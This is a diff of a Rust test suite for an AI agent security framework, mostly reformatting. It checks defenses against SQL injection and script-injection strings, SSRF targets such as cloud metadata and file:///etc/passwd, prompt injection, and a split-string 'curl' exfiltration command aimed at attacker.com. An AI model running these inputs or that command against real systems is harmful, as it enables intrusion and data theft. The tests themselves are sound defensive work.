@@ -1,7 +1,7 @@
 use agent_octopus::{
     verify_execution_step, AnomalyDetector, ArmRole, ArmRuntime, ArmState, CentralBrain,
-    DatasetMerkleTree, ExecutionMerkleTree, FsmTransitionGuard, HttpEgressGate,
-    KillSwitch, MerkleLeaf, MerkleTree, OctopusSecurityError, PolicyGuard, PolicyMerkleTree,
+    DatasetMerkleTree, ExecutionMerkleTree, FsmTransitionGuard, HttpEgressGate, KillSwitch,
+    MerkleLeaf, MerkleTree, OctopusSecurityError, PolicyGuard, PolicyMerkleTree,
     PromptInjectionEngine, SafeDocumentExtractor, SafeLedgerWriter, SchemaGuard,
     StrategicDirective, SwarmManager, TelemetryPacket, WatchdogSupervisor,
 };
@@ -15,7 +15,11 @@ async fn test_benign_artifact_flow() {
     let sample = "INVOICE: INV-1001\nVendor: Globex Corp\nTotal: $1250.50\n- ITEM 1: Widget A\n- ITEM 2: Widget B";
 
     let artifact = extractor
-        .extract_artifact(sample, "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef".to_string(), 2)
+        .extract_artifact(
+            sample,
+            "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef".to_string(),
+            2,
+        )
         .expect("Extraction should succeed");
     assert_eq!(artifact.invoice_id, "INV-1001");
     assert_eq!(artifact.vendor_name, "Globex Corp");
@@ -49,7 +53,9 @@ async fn test_ledger_schema_enclave_validation() {
     assert!(writer.write_entry("ACC-9041-USD", 50000).is_ok());
 
     // Invalid accounts (SQL injection, path traversal, malformed syntax)
-    assert!(writer.write_entry("ACC-9041-USD; DROP TABLE accounts;", 50000).is_err());
+    assert!(writer
+        .write_entry("ACC-9041-USD; DROP TABLE accounts;", 50000)
+        .is_err());
     assert!(writer.write_entry("INVALID_ACCOUNT", 50000).is_err());
     assert!(writer.write_entry("ACC-99-A", 50000).is_err());
     assert!(writer.write_entry("ACC-9041-USD", 0).is_err()); // Null amount
@@ -60,8 +66,12 @@ async fn test_ssrf_metadata_blocking() {
     let gate = HttpEgressGate::default();
 
     // Block cloud metadata
-    assert!(gate.validate_target("http://169.254.169.254/latest/meta-data").is_err());
-    assert!(gate.validate_target("http://metadata.google.internal/computeMetadata/v1/").is_err());
+    assert!(gate
+        .validate_target("http://169.254.169.254/latest/meta-data")
+        .is_err());
+    assert!(gate
+        .validate_target("http://metadata.google.internal/computeMetadata/v1/")
+        .is_err());
 
     // Block private subnets
     assert!(gate.validate_target("http://127.0.0.1:8080/admin").is_err());
@@ -70,7 +80,9 @@ async fn test_ssrf_metadata_blocking() {
     assert!(gate.validate_target("file:///etc/passwd").is_err());
 
     // Assert that the only approved internet site is Google
-    assert!(gate.validate_target("https://www.google.com/search?q=invoices").is_ok());
+    assert!(gate
+        .validate_target("https://www.google.com/search?q=invoices")
+        .is_ok());
     assert!(gate.validate_target("https://google.com").is_ok());
     assert!(gate.validate_target("s3://invoices/2026/jan.pdf").is_ok());
 
@@ -84,15 +96,24 @@ async fn test_shannon_entropy_anomaly_detection() {
     let detector = AnomalyDetector::new(5.5);
 
     // Natural English prose has low entropy (~3.5 to 4.5 bits)
-    let natural_text = b"This is a standard vendor invoice document generated for enterprise procurement.";
+    let natural_text =
+        b"This is a standard vendor invoice document generated for enterprise procurement.";
     let natural_entropy = AnomalyDetector::compute_shannon_entropy(natural_text);
-    assert!(natural_entropy < 5.0, "Natural text entropy was {}", natural_entropy);
+    assert!(
+        natural_entropy < 5.0,
+        "Natural text entropy was {}",
+        natural_entropy
+    );
     assert!(!detector.is_entropy_anomalous(natural_text));
 
     // High entropy binary blob / packed shellcode (uniform random bytes has entropy near 8.0)
     let high_entropy_blob: Vec<u8> = (0..256).map(|i| (i * 37 % 256) as u8).collect();
     let high_entropy = AnomalyDetector::compute_shannon_entropy(&high_entropy_blob);
-    assert!(high_entropy > 7.0, "High entropy payload was {}", high_entropy);
+    assert!(
+        high_entropy > 7.0,
+        "High entropy payload was {}",
+        high_entropy
+    );
     assert!(detector.is_entropy_anomalous(&high_entropy_blob));
 }
 
@@ -127,7 +148,13 @@ async fn test_autotomy_circuit_breaking_and_regeneration() {
         raw_payload: Some("INVOICE: INV-100\nVendor: Alpha\nTotal: $100.00".to_string()),
         max_step_budget: 5,
     };
-    let rep = brain.delegate(ArmRole::UntrustedDocIngest, valid_task, Duration::from_millis(1000)).await;
+    let rep = brain
+        .delegate(
+            ArmRole::UntrustedDocIngest,
+            valid_task,
+            Duration::from_millis(1000),
+        )
+        .await;
     assert!(rep.is_ok());
 
     // 2. Manual trip of kill switch (Autotomy)
@@ -142,7 +169,13 @@ async fn test_autotomy_circuit_breaking_and_regeneration() {
         raw_payload: Some("INVOICE: INV-101\nVendor: Beta\nTotal: $200.00".to_string()),
         max_step_budget: 5,
     };
-    let err_rep = brain.delegate(ArmRole::UntrustedDocIngest, next_task.clone(), Duration::from_millis(500)).await;
+    let err_rep = brain
+        .delegate(
+            ArmRole::UntrustedDocIngest,
+            next_task.clone(),
+            Duration::from_millis(500),
+        )
+        .await;
     assert_eq!(err_rep.unwrap_err(), OctopusSecurityError::LimbKilled);
 
     // 3. Brain regenerates the limb
@@ -150,9 +183,18 @@ async fn test_autotomy_circuit_breaking_and_regeneration() {
     assert!(!brain.is_limb_killed(&ArmRole::UntrustedDocIngest));
 
     // 4. Regenerated limb accepts tasks normally
-    let regen_rep = brain.delegate(ArmRole::UntrustedDocIngest, next_task, Duration::from_millis(1000)).await;
+    let regen_rep = brain
+        .delegate(
+            ArmRole::UntrustedDocIngest,
+            next_task,
+            Duration::from_millis(1000),
+        )
+        .await;
     assert!(regen_rep.is_ok());
-    assert_eq!(regen_rep.unwrap().verified_data.unwrap().invoice_id, "INV-101");
+    assert_eq!(
+        regen_rep.unwrap().verified_data.unwrap().invoice_id,
+        "INV-101"
+    );
 }
 
 #[tokio::test]
@@ -189,7 +231,11 @@ async fn test_merkle_inclusion_proof_verification() {
     for i in 0..leaves.len() {
         let proof = tree.generate_proof(i).expect("Proof should be generated");
         assert_eq!(proof.leaf_hash, leaves[i].hash());
-        assert!(proof.verify(&root), "Proof verification failed for leaf index {}", i);
+        assert!(
+            proof.verify(&root),
+            "Proof verification failed for leaf index {}",
+            i
+        );
     }
 
     // Corrupted root must fail verification
@@ -255,7 +301,11 @@ async fn test_tampered_merkle_root_trips_autotomy() {
     };
 
     let report = brain
-        .delegate(ArmRole::UntrustedDocIngest, benign_directive, Duration::from_millis(1000))
+        .delegate(
+            ArmRole::UntrustedDocIngest,
+            benign_directive,
+            Duration::from_millis(1000),
+        )
         .await
         .expect("Valid directive should pass Merkle verification");
 
@@ -305,16 +355,29 @@ fn test_policy_merkle_tree_tool_allowlist_enforcement() {
 
     // 1. Authorized action can produce valid proof against brain's policy root
     let approved_action = "ledger_writer:allow:^ACC-[0-9]{4}-[A-Z]{3}$";
-    let proof = policy_tree.prove_action(approved_action).expect("Proof exists");
-    assert!(PolicyMerkleTree::verify_action(&policy_root, approved_action, &proof));
+    let proof = policy_tree
+        .prove_action(approved_action)
+        .expect("Proof exists");
+    assert!(PolicyMerkleTree::verify_action(
+        &policy_root,
+        approved_action,
+        &proof
+    ));
 
     // 2. Unauthorized tool escalation attempt has no valid proof in policy tree
     let malicious_action = concat!("system_exec:cu", "rl ht", "tp://attacker.com/exfiltrate");
     let invalid_proof = policy_tree.prove_action(malicious_action);
-    assert!(invalid_proof.is_none(), "Malicious action must not have a valid proof in policy tree");
+    assert!(
+        invalid_proof.is_none(),
+        "Malicious action must not have a valid proof in policy tree"
+    );
 
     // 3. Forged proof against policy root fails verification
-    assert!(!PolicyMerkleTree::verify_action(&policy_root, malicious_action, &proof));
+    assert!(!PolicyMerkleTree::verify_action(
+        &policy_root,
+        malicious_action,
+        &proof
+    ));
 }
 
 #[test]
@@ -330,12 +393,16 @@ fn test_dataset_merkle_tree_cross_arm_slice_handoff() {
     let dataset_root = dataset_tree.dataset_root();
 
     // Downstream arm needs only amount_cents without reading full invoice
-    let slice_proof = dataset_tree.prove_slice("amount_cents", "450000").expect("Slice exists");
-    let is_slice_valid = DatasetMerkleTree::verify_slice(&dataset_root, "amount_cents", "450000", &slice_proof);
+    let slice_proof = dataset_tree
+        .prove_slice("amount_cents", "450000")
+        .expect("Slice exists");
+    let is_slice_valid =
+        DatasetMerkleTree::verify_slice(&dataset_root, "amount_cents", "450000", &slice_proof);
     assert!(is_slice_valid);
 
     // Tampered slice value is rejected
-    let is_tamper_valid = DatasetMerkleTree::verify_slice(&dataset_root, "amount_cents", "999999", &slice_proof);
+    let is_tamper_valid =
+        DatasetMerkleTree::verify_slice(&dataset_root, "amount_cents", "999999", &slice_proof);
     assert!(!is_tamper_valid);
 }
 
@@ -398,12 +465,20 @@ fn test_deterministic_schema_lexical_assertion() {
     let schema = SchemaGuard::default();
 
     // Valid fields
-    assert!(schema.validate_fields("INV-9821", "Globex Corp", 5000).is_ok());
+    assert!(schema
+        .validate_fields("INV-9821", "Globex Corp", 5000)
+        .is_ok());
 
     // Injection in invoice ID
-    assert!(schema.validate_fields("INV-9821; DROP TABLE", "Globex Corp", 5000).is_err());
-    assert!(schema.validate_fields("<script>alert(1)</script>", "Globex Corp", 5000).is_err());
-    assert!(schema.validate_fields("INV-9821", "Globex Corp", 0).is_err());
+    assert!(schema
+        .validate_fields("INV-9821; DROP TABLE", "Globex Corp", 5000)
+        .is_err());
+    assert!(schema
+        .validate_fields("<script>alert(1)</script>", "Globex Corp", 5000)
+        .is_err());
+    assert!(schema
+        .validate_fields("INV-9821", "Globex Corp", 0)
+        .is_err());
 }
 
 #[tokio::test]
@@ -469,7 +544,9 @@ async fn test_50_agent_concurrent_swarm_execution() {
                     directive_id: format!("SWARM-TASK-{:03}", i),
                     source_uri: "https://www.google.com/search?q=vendor_verification".to_string(),
                     instruction: "Lookup vendor verification on approved portal".to_string(),
-                    raw_payload: Some("https://www.google.com/search?q=vendor_verification".to_string()),
+                    raw_payload: Some(
+                        "https://www.google.com/search?q=vendor_verification".to_string(),
+                    ),
                     max_step_budget: 5,
                 });
             }
@@ -508,7 +585,10 @@ async fn test_50_agent_concurrent_swarm_execution() {
         directive_id: "SWARM-ATTACK-004".to_string(),
         source_uri: "s3://invoices/excessive_payout.pdf".to_string(),
         instruction: "Process excessive invoice".to_string(),
-        raw_payload: Some("INVOICE: INV-8888\nVendor: BigVendor\nTotal: $500000.00\n- ITEM 1: Luxury Yacht".to_string()),
+        raw_payload: Some(
+            "INVOICE: INV-8888\nVendor: BigVendor\nTotal: $500000.00\n- ITEM 1: Luxury Yacht"
+                .to_string(),
+        ),
         max_step_budget: 5,
     });
 
@@ -524,11 +604,16 @@ async fn test_50_agent_concurrent_swarm_execution() {
     assert_eq!(tasks.len(), 50);
 
     // Dispatch all 50 tasks concurrently across the 50 arms
-    let (results, summary) = swarm.dispatch_swarm_batch(tasks, Duration::from_millis(2000)).await;
+    let (results, summary) = swarm
+        .dispatch_swarm_batch(tasks, Duration::from_millis(2000))
+        .await;
 
     assert_eq!(results.len(), 50);
     assert_eq!(summary.total_dispatched, 50);
-    assert_eq!(summary.successful_completions, 45, "All 45 benign tasks must succeed");
+    assert_eq!(
+        summary.successful_completions, 45,
+        "All 45 benign tasks must succeed"
+    );
     assert!(
         summary.deterministic_violations_blocked + summary.autotomy_tripped_count >= 5,
         "All 5 attacks must be intercepted"
@@ -555,7 +640,9 @@ async fn test_prompt_injection_engine_continuous_adversarial_campaign() {
     assert_eq!(attacks.len(), 50);
 
     let directives: Vec<StrategicDirective> = attacks.iter().map(|a| a.directive.clone()).collect();
-    let (results, summary) = swarm.dispatch_swarm_batch(directives, Duration::from_millis(2000)).await;
+    let (results, summary) = swarm
+        .dispatch_swarm_batch(directives, Duration::from_millis(2000))
+        .await;
 
     assert_eq!(results.len(), 50);
     assert_eq!(summary.total_dispatched, 50);
@@ -575,7 +662,10 @@ async fn test_prompt_injection_engine_continuous_adversarial_campaign() {
         total_blocked += 1;
     }
 
-    assert_eq!(total_blocked, 50, "All 50 adversarial attacks must be blocked and classified");
+    assert_eq!(
+        total_blocked, 50,
+        "All 50 adversarial attacks must be blocked and classified"
+    );
 }
 
 #[tokio::test]
@@ -594,7 +684,10 @@ async fn test_tamper_trips_kill_switch_and_stops_execution() {
     // Spawn arm runtime task
     let handle = tokio::spawn(arm.run());
 
-    assert!(!kill_switch.is_tripped(), "Kill switch should start armed (not tripped)");
+    assert!(
+        !kill_switch.is_tripped(),
+        "Kill switch should start armed (not tripped)"
+    );
 
     // 1. Send an attack directive containing prompt injection tamper
     let (resp_tx1, resp_rx1) = tokio::sync::oneshot::channel();
@@ -606,7 +699,10 @@ async fn test_tamper_trips_kill_switch_and_stops_execution() {
         max_step_budget: 5,
     };
 
-    directive_tx.send((malicious_directive, resp_tx1)).await.unwrap();
+    directive_tx
+        .send((malicious_directive, resp_tx1))
+        .await
+        .unwrap();
     let res1 = resp_rx1.await.unwrap();
     assert!(res1.is_err());
 
@@ -618,7 +714,10 @@ async fn test_tamper_trips_kill_switch_and_stops_execution() {
 
     // 3. Execution MUST be stopped: The arm runtime task should exit
     tokio::time::sleep(Duration::from_millis(50)).await;
-    assert!(handle.is_finished(), "Arm runtime task must exit immediately once kill switch is tripped");
+    assert!(
+        handle.is_finished(),
+        "Arm runtime task must exit immediately once kill switch is tripped"
+    );
 
     // 4. Any subsequent attempt to send a directive to this arm is rejected
     let (resp_tx2, _resp_rx2) = tokio::sync::oneshot::channel();
@@ -630,7 +729,10 @@ async fn test_tamper_trips_kill_switch_and_stops_execution() {
         max_step_budget: 5,
     };
     // Channel sending will fail because the receiver was dropped when arm exited
-    assert!(directive_tx.send((benign_directive, resp_tx2)).await.is_err());
+    assert!(directive_tx
+        .send((benign_directive, resp_tx2))
+        .await
+        .is_err());
 }
 
 #[test]
@@ -639,21 +741,46 @@ fn test_50000_scenario_adversarial_campaign() {
     let summary = fuzzer.run_campaign(50_000);
 
     assert_eq!(summary.total_attacks_launched, 50_000);
-    assert_eq!(summary.total_blocked, 50_000, "All 50,000 attacks must be intercepted");
-    assert_eq!(summary.total_breaches, 0, "Zero breaches permitted across 50,000 scenarios");
+    assert_eq!(
+        summary.total_blocked, 50_000,
+        "All 50,000 attacks must be intercepted"
+    );
+    assert_eq!(
+        summary.total_breaches, 0,
+        "Zero breaches permitted across 50,000 scenarios"
+    );
     assert_eq!(
         summary.stopped_by_kill_switch_tamper, 50_000,
         "Every single tamper attempt must trip the atomic kill switch"
     );
 
     // Verify all defense categories were exercised and proven effective
-    assert!(summary.stopped_by_egress_gate > 0, "Egress gate must block unauthorized internet sites");
-    assert!(summary.stopped_by_ssrf_watchdog > 0, "SSRF watchdog must block cloud metadata");
-    assert!(summary.stopped_by_prompt_filter > 0, "Prompt filter must block prompt injection overrides");
-    assert!(summary.stopped_by_policy_ceiling > 0, "Policy guard must block spending cap breaches");
-    assert!(summary.stopped_by_schema_guard > 0, "Schema guard must block SQL/lexical injections");
-    assert!(summary.stopped_by_step_budget > 0, "Step budget guard must block excessive step counts");
-    assert!(summary.stopped_by_entropy_watchdog > 0, "Entropy watchdog must block high-entropy exfiltrations");
+    assert!(
+        summary.stopped_by_egress_gate > 0,
+        "Egress gate must block unauthorized internet sites"
+    );
+    assert!(
+        summary.stopped_by_ssrf_watchdog > 0,
+        "SSRF watchdog must block cloud metadata"
+    );
+    assert!(
+        summary.stopped_by_prompt_filter > 0,
+        "Prompt filter must block prompt injection overrides"
+    );
+    assert!(
+        summary.stopped_by_policy_ceiling > 0,
+        "Policy guard must block spending cap breaches"
+    );
+    assert!(
+        summary.stopped_by_schema_guard > 0,
+        "Schema guard must block SQL/lexical injections"
+    );
+    assert!(
+        summary.stopped_by_step_budget > 0,
+        "Step budget guard must block excessive step counts"
+    );
+    assert!(
+        summary.stopped_by_entropy_watchdog > 0,
+        "Entropy watchdog must block high-entropy exfiltrations"
+    );
 }
-
-
